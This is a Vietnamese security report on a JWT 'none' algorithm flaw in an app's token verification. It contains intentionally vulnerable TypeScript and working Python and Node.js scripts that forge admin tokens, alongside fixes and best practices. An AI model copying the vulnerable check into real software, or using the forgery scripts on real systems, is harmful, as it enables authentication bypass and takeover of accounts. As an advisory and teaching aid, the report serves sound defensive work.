# Báo Cáo Lỗ Hổng Bảo Mật: JWT Algorithm Confusion Attack

## Tổng Quan

Lỗ hổng này cho phép kẻ tấn công tạo JWT token giả mạo mà không cần biết secret key bằng cách sử dụng algorithm "none".

## Mô Tả Lỗ Hổng

### Vị Trí
- File: `src/lib/jwt.ts`
- Hàm: `verifyAccessToken()`

### Nguyên Nhân
Hàm `verifyAccessToken()` không kiểm tra và từ chối algorithm "none". Khi token sử dụng algorithm "none", hàm sẽ chấp nhận token mà không verify signature, cho phép kẻ tấn công tạo token với payload tùy ý.

### Code Vulnerable

```typescript
export const verifyAccessToken = (token: string) => {
  const decoded = jwt.decode(token, { complete: true });
  
  // VULNERABILITY: Accept "none" algorithm without verification
  if (decoded.header.alg === 'none') {
    return decoded.payload; // Bypass signature verification!
  }
  
  return jwt.verify(token, config.JWT_ACCESS_SECRET);
};
```

## Cách Khai Thác

### Bước 1: Tạo Token Giả Mạo

Kẻ tấn công có thể tạo một JWT token với:
- Header: `{"alg":"none","typ":"JWT"}`
- Payload: Chứa `userId` và `role` tùy ý (ví dụ: `role: "admin"`)

### Bước 2: Tạo Token Bằng Python

```python
import base64
import json

# Header với algorithm "none"
header = {
    "alg": "none",
    "typ": "JWT"
}

# Payload với role admin
payload = {
    "userId": "507f1f77bcf86cd799439011",  # ID của user muốn giả mạo
    "role": "admin",  # Nâng quyền lên admin
    "iat": 1234567890,
    "exp": 9999999999  # Token không bao giờ hết hạn
}

# Encode header và payload
header_encoded = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_encoded = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# Token với algorithm "none" không cần signature
token = f"{header_encoded}.{payload_encoded}."

print(f"Token giả mạo: {token}")
```

### Bước 3: Sử Dụng Token

```bash
curl -X GET http://localhost:3000/api/v1/users/current \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJyb2xlIjoiYWRtaW4ifQ."
```

### Bước 4: Tạo Token Bằng Node.js

```javascript
const base64Url = require('base64url');

const header = {
  alg: 'none',
  typ: 'JWT'
};

const payload = {
  userId: '507f1f77bcf86cd799439011',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: 9999999999
};

const headerEncoded = base64Url(JSON.stringify(header));
const payloadEncoded = base64Url(JSON.stringify(payload));

// Token với algorithm "none" - không cần signature
const fakeToken = `${headerEncoded}.${payloadEncoded}.`;

console.log('Token giả mạo:', fakeToken);
```

### Bước 5: Sử Dụng Online Tool

Có thể sử dụng các công cụ online như:
- https://jwt.io
- Tạo token với algorithm "none" và payload tùy ý

## Tác Động

### Mức Độ Nghiêm Trọng
**CRITICAL** - CVSS Score: 9.1 (Critical)

### Hậu Quả
1. **Privilege Escalation**: Kẻ tấn công có thể nâng quyền lên admin
2. **Authentication Bypass**: Bypass hoàn toàn hệ thống xác thực
3. **Data Breach**: Truy cập dữ liệu của bất kỳ user nào
4. **Unauthorized Actions**: Thực hiện các hành động không được phép

## Cách Khắc Phục

### Giải Pháp 1: Từ Chối Algorithm "none"

```typescript
export const verifyAccessToken = (token: string) => {
  const decoded = jwt.decode(token, { complete: true }) as {
    header: { alg: string };
    payload: any;
  } | null;

  if (!decoded) {
    throw new jwt.JsonWebTokenError('Invalid token');
  }

  // FIX: Reject "none" algorithm
  if (decoded.header.alg === 'none') {
    throw new jwt.JsonWebTokenError('Algorithm "none" is not allowed');
  }

  // Always verify with expected algorithm
  return jwt.verify(token, config.JWT_ACCESS_SECRET, {
    algorithms: ['HS256'] // Chỉ chấp nhận HS256
  });
};
```

### Giải Pháp 2: Chỉ Định Algorithm Cụ Thể

```typescript
export const verifyAccessToken = (token: string) => {
  // FIX: Always specify allowed algorithms
  return jwt.verify(token, config.JWT_ACCESS_SECRET, {
    algorithms: ['HS256'] // Chỉ chấp nhận HS256, từ chối tất cả algorithm khác
  });
};
```

### Giải Pháp 3: Sử Dụng Complete Verification

```typescript
export const verifyAccessToken = (token: string) => {
  // FIX: Verify với complete options
  return jwt.verify(token, config.JWT_ACCESS_SECRET, {
    algorithms: ['HS256'],
    complete: false,
    ignoreExpiration: false,
    ignoreNotBefore: false
  });
};
```

## Best Practices

1. **Luôn chỉ định algorithms**: Không bao giờ để mặc định algorithm
2. **Từ chối "none" algorithm**: Luôn reject algorithm "none"
3. **Validate token structure**: Kiểm tra header, payload format
4. **Use strong secrets**: Sử dụng secret key mạnh và dài
5. **Token expiration**: Luôn set expiration time hợp lý
6. **Audit logging**: Log tất cả authentication attempts

## Tài Liệu Tham Khảo

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [CWE-327: Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

## Lịch Sử

- **Ngày phát hiện**: [Ngày hiện tại]
- **Ngày báo cáo**: [Ngày hiện tại]
- **Trạng thái**: VULNERABLE (Đang được sử dụng cho mục đích giáo dục/báo cáo)

